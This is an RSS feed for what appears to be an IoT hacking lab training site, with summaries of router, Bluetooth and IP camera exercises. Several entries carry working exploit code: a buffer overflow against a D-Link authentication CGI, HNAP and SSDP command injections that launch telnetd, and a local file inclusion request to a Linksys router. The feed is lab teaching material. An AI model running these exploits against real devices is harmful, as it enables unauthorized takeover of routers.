<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>IoT Hack Labs</title><link>https://iot-hack-labs.github.io/</link><description>Recent content on IoT Hack Labs</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 18 Oct 2021 20:52:11 -0600</lastBuildDate><atom:link href="https://iot-hack-labs.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Auth Buffer Overflow</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/auth-buffer-overflow/</guid><description>Auth Buffer Overflow import urllib import urllib2 # This exploits the auth_main.cgi with read buffer overflow exploit for v2.02 # prequisite is just to have id and password fields in params url = &amp;#39;http://192.168.0.1/authentication.cgi&amp;#39; junk = &amp;#34;A&amp;#34;*1004+&amp;#34;B&amp;#34;*37+&amp;#34;\x58\xf8\x40\x00&amp;#34; # address of system function in executable junk+=&amp;#34;X&amp;#34;*164+&amp;#39;echo &amp;#34;Admin&amp;#34; &amp;#34;Admin&amp;#34; &amp;#34;0&amp;#34; &amp;gt; /var/passwd\x00&amp;#39;+&amp;#34;AAAA&amp;#34; values = &amp;#34;id=test&amp;amp;password=test&amp;amp;test=&amp;#34;+junk req = urllib2.Request(url, values) response = urllib2.urlopen(req) the_page = response.read()</description></item><item><title>Brute Force Login</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/02-brute-force-login/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/02-brute-force-login/</guid><description>We can see if the login has been configured with weak credentials by using a brute force attack with a password list. There are several tools to do this. We will use a Metasploit.
Metasploit Metasploit is an exploitation framework that will allow us to select a target and run different modules. We will use a module created to automate login attempts against some dlink routers.
In a terminal, open up Metasploit.</description></item><item><title>Command Injection</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/03-command-injection/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/03-command-injection/</guid><description>The DIR 815 is vulnerable to command injection once authenticated. Make sure you found the password from the previous steps.
Open Burpsuite For this step, we will use Burpsuite.
Click the Kali drop down in the top left corner and search for Burp.
Open Burp. This may take a few seconds. Click Next Click Start Burp Navigate to &amp;ldquo;Proxy&amp;rdquo; &amp;gt; &amp;ldquo;Intercept&amp;rdquo; tab and turn off Intercept.
Open Firefox Open Firefox and click on the &amp;ldquo;Foxy Proxy&amp;rdquo; extension.</description></item><item><title>Discovery</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/01-discovery/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/01-discovery/</guid><description>Run nmap against the target. The -Pn flag is used to scan ports even though nmap is not receiving a ping response from the device.
nmap 172.21.0.23 -Pn
You should see that only port 8080 is shown as open.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 13:20 MDT
Nmap scan report for 172.21.0.23
Host is up (0.</description></item><item><title>Discovery</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/01-discovery/</guid><description>About This will guide you how to exploit a Mikrotik running Router Os.
First, run nmap against the target to discover what ports are open. -Pn: scan the device even though its not responding to ping. --top-ports=4000 will scan the top 4000 most common service ports. The default is 1000, and will miss one of the open ports. nmap 172.21.0.4 --top-ports=4000 -Pn You should see that there are 2 open ports, 21 and 8291.</description></item><item><title>Getting Started</title><link>https://iot-hack-labs.github.io/btle-labs/01-getting-started/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/01-getting-started/</guid><description>Devices Because it may be difficult to scan for all Bluetooth devices in such a crowded area, the BLE_CTF_INFINITY MAC addresses for each challenge are provided below.
Challenge 0: 94:B9:7E:DA:08:56 Challenge 1: 08:3A:F2:7D:65:8A Challenge 2: 94:B9:7E:FA:27:72 Challenge 3: 94:B9:7E:F9:21:B6 Tools We can use a few different tools to solve some BLE CTF Infinity challenges.
hciconfig bleah gatttool Hciconfig You can view BLE interfaces on you system by using the hciconfig command.</description></item><item><title>Local File Inclusion</title><link>https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/wrt160n/local-file-inclusion/</guid><description>Local File Inclusion Run the following command to retrieve the flag:
curl --user &amp;#39;admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT&amp;#39; -X POST -d &amp;#34;submit_type=wsc_method2&amp;amp;change_action=gozila_cgi&amp;amp;next_page=../../tmp/flag.txt&amp;#34; http://172.21.0.15:8080/apply.cgi The next_page parameter in the request specifies the file we want to read. The content of the file will be returned in the response.</description></item><item><title>OS Command Injection I</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-i/</guid><description>OS Command Injection I import socket import struct # CSRF or any other trickery, but probably only works when connected to network I suppose buf = &amp;#34;POST /HNAP1/ HTTP/1.0\r\nHOST: 99.249.143.124\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX&amp;#34; + &amp;#39;;telnetd -p 9090;\r\n&amp;#39; + &amp;#34;1\r\n\r\n&amp;#34; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((&amp;#34;192.168.0.1&amp;#34;, 80)) s.send(buf) or
import socket import struct # format junk+ROP1(have right value in A0) + ROP2(add or subtract to create right system address) + ROP3(Jump to right address) buf = &amp;#34;POST /HNAP1/ HTTP/1.</description></item><item><title>OS Command Injection II</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/os-command-injection-ii/</guid><description>OS Command Injection II import socket import struct # This vulnerability is pretty much in every router that has cgibin and uses SSDP code in that cgibin. This one worked on the device dir-815. Will work only in WLAN buf = &amp;#39;M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:urn:schemas-upnp-org:service:WANIPConnection:1;telnetd -p 9094;ls\r\nMX:2\r\nMAN:&amp;#34;ssdp:discover&amp;#34;\r\n\r\n&amp;#39; print &amp;#34;[+] sending buffer size&amp;#34;, len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((&amp;#34;239.255.255.250&amp;#34;, 1900)) s.send(buf) s.close()</description></item><item><title>References</title><link>https://iot-hack-labs.github.io/router-lab/dir-815/references/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/dir-815/references/</guid><description>References https://www.exploit-db.com/exploits/38721 https://www.exploit-db.com/exploits/38715</description></item><item><title>Exploitation</title><link>https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/router-lab/mikrotik/02-exploitation/</guid><description>After searching online, we find that the version of Mikrotik/RouterOS should be vulnerable to an exploit called &amp;ldquo;By The Way&amp;rdquo;
Exploitation The following versions of Router OS are vulnerable to &amp;ldquo;ByTheWay&amp;rdquo; exploit:
Longterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3 The Tenable security team has created a POC for the &amp;ldquo;By The Way&amp;rdquo; exploit, found here: https://github.com/tenable/routeros/tree/master/poc/bythewayThe repo is already cloned, and the exploit compiled.
Navigate to ~/routeros/poc/bytheway/build cd ~/routeros/poc/bytheway/build Run the exploit against the Mikrotik .</description></item><item><title>Flag0</title><link>https://iot-hack-labs.github.io/btle-labs/02-flag0/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/02-flag0/</guid><description>This is device #7 (94:B9:7E:DA:08:56)
Use bettercap to enumerate the characteristics on the device.
sudo bettercap ble.recon on ble.enum 94:B9:7E:DA:08:56 ⚠️ Try this a few times if it doesn&amp;rsquo;t work and/or removing and plugging in the bluetooth dongle.
For the flag 0, we see that the &amp;lsquo;Device Name&amp;rsquo; kinda looks like a flag.</description></item><item><title>Flag1</title><link>https://iot-hack-labs.github.io/btle-labs/03-flag1/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/03-flag1/</guid><description>Use Bettercap to Enumerate All Characteristics At this point, if we try to use bleah to enumerate the characteristics, we see that bleah shows us some interesting values.
sudo bleah -b 08:3A:F2:7D:65:8A -e When enumerating, the value at handle 0x002a returns goodbye 👋. This disconnects the device. We have to use another tool to target reading the other values.
Use Gatttool to Read Characteristics Read the value at 0x002c using gatttool.</description></item><item><title>Flag2</title><link>https://iot-hack-labs.github.io/btle-labs/04-flag2/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/04-flag2/</guid><description>View Gatt Table After switching to challenge 2, use bettercap to enumerate its characteristics again.
sudo bettercap ble.recon on ble.enum 94:B9:7E:FA:27:72 We see that there is some authentication required, and that we should connect with pin 0000. We can do this with gatttool.
Use Gatttool with Authentication gatttool --sec-level=high -b 94:B9:7E:FA:27:72 --char-read -a 0x002c This will prompt you for the pin. Enter 0000 and click OK.
After authenticating, it will then print the value of 0x002c.</description></item><item><title>Flag3</title><link>https://iot-hack-labs.github.io/btle-labs/05-flag3/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/05-flag3/</guid><description>View Gatt Table Use bettercap to enumerate its characteristics again.
sudo bettercap ble.recon on ble.enum 94:B9:7E:F9:21:B6 We can see that it is looking for a device with the MAC address 11:22:33:44:55:66 to connect to it.
View the Interface MAC Address Use hciconfig to view the MAC address of the interface.
Spooftooph We can spoof our mac address with the tool spooftooph. (Make sure to use sudo)
sudo spooftooph -i hci0 -a 11:22:33:44:55:66 Once we have done this, we need to reset the interface for the changes to take.</description></item><item><title>Finishing up</title><link>https://iot-hack-labs.github.io/btle-labs/09-outro/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/09-outro/</guid><description>References https://github.com/hackgnar/ble_ctf_infinity Chapter 11 of Practical IoT Hackingfrom No Starch Press.</description></item><item><title>Ultraloq-UL3</title><link>https://iot-hack-labs.github.io/btle-labs/99-ultraloq-ul3/</link><pubDate>Mon, 18 Oct 2021 20:39:54 -0600</pubDate><guid>https://iot-hack-labs.github.io/btle-labs/99-ultraloq-ul3/</guid><description>Ultraloq UL3 Find the firmware version that is being broadcasted by the Ultraloq UL3 Bluetooth enabled lock.
This can be done using some different tools.
Bettercap Because there are so many BLE devices in crowded areas, we will provide you the MAC address of the Ultraloq UL3:
78:DB:2F:DA:BA:3B
You can also use a tool like bettercap to find this.
sudo bettercap
ble.recon on
You will have to turn off recon shortly after starting it because there are so many devices.</description></item><item><title>Dump Firmware</title><link>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/01-dump-firmware/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/01-dump-firmware/</guid><description>The first step in enabling remote connections is to dump the camera&amp;rsquo;s firmware.
You may notice that, though we have shell, basic commands like whoami seem to give errors
/ # whoami whoami: unknown uid 0 This is because we bypassed the initialization scripts that would mount file systems and start and configure certain services.
We could simply run /init but the camera&amp;rsquo;s services all output to stdout which make it nearly impossible to use the shell.</description></item><item><title>Modify Firmware</title><link>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/02-modify-firmware/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/02-modify-firmware/</guid><description>The following steps need to be done on the laptop
The block device that we need to modify is just a squashfs filesystem file.
Home Only To extract the files from the firmware, lets install the squashfs tools
sudo apt install squashfs-tools 2&amp;gt; /dev/null Now connect the micro SD to the computer and mount the card
sudo mkdir /mnt/pc420 sudo mount /dev/sdb1 /mnt/pc420 Now run the following to unsquash the root filesystem:</description></item><item><title>UART to U-Boot</title><link>https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/</link><pubDate>Mon, 18 Oct 2021 20:47:46 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/02-uart-to-uboot/</guid><description>Home Only We will now connect to the Victure camera via the USB to TTL adapter.
Connect the female ends of the jumper cables to the TX, RX, and GND pins on the USB to TTL adapter shown above. Once done, connect the adapter to the computer
Now connect the male ends of the jumper cables to the camera&amp;rsquo;s UART ports according to the following table</description></item><item><title>Build Firmware</title><link>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/03-build-firmware/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/03-build-firmware/</guid><description>Now that we have modified the initialization scripts, we are going to &amp;lsquo;resquash&amp;rsquo; the files
mksquashfs rootfs /mnt/pc420/root.sqsh4 -comp xz Where,
rootfs: The path to the directory containing the filesystem /mnt/pc420/root.sqsh4: The destination of the resulting squashfs file -comp xz: Compress the filesystem using xz Once complete, unmount the micro SD card
sudo umount /mnt/pc420</description></item><item><title>U-Boot to Root</title><link>https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/03-uboot-to-root/</guid><description>The current shell is actually a U-Boot a limited shell. U-Boot is an open-source, primary boot loader. This shell has commands related to the booting process.
anyka$ help ? - alias for &amp;#39;help&amp;#39; base - print or set address offset bootm - boot application image from memory bootp - boot image via network using BOOTP/TFTP protocol chpart - change active partition cmp - memory compare cp - memory copy crc32 - checksum calculation downcheck_patition_update- load usr.</description></item><item><title>Update Camera Firmware</title><link>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/04-update-camera-firmware/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/04-update-camera-firmware/</guid><description>The following commands need to be run on the camera
Now that we have the modified squashfs file, we can update the camera&amp;rsquo;s firmware. Plug the micro SD into the camera and run the following
/usr/sbin/update.sh Where,
/usr/sbin/update.sh: Runs the script to update the camera&amp;rsquo;s firmware The camera should reboot once it is done updating.</description></item><item><title>Connect Camera to WiFi</title><link>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/05-connect-camera-to-wifi/</link><pubDate>Mon, 18 Oct 2021 20:48:21 -0601</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/configure-remote-connection/05-connect-camera-to-wifi/</guid><description>Now that the firmware has been updated, we no longer need to boot to /bin/sh. To change the bootargs, follow the steps taken in the UART to U-Boot section to get into the U-Boot shell and run the following:
setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/init mem=64M memsize=64M saveenv Saving Environment to SPI Flash... Env save done OK Now disconnect and reconnect the power to the camera. The camera should not boot into a shell but should run our modified initialization scripts.</description></item><item><title>Test Remote Connection</title><link>https://iot-hack-labs.github.io/victure-pc420/09-test-remote-connection/</link><pubDate>Mon, 18 Oct 2021 20:52:11 -0600</pubDate><guid>https://iot-hack-labs.github.io/victure-pc420/09-test-remote-connection/</guid><description>Now that the camera is connected to the WiFi, we should be able to disconnect our USB to TTL adapter and remotely connect to it.
telnet 172.21.0.69 Trying 172.21.0.69... Connected to 172.21.0.69. Escape character is '^]'. anyka login: root Password: welcome to file system [root@anyka ~]$ uname -a Linux anyka 3.4.35 #9 Thu Feb 25 11:45:35 UTC 2021 armv5tejl GNU/Linux</description></item></channel></rss>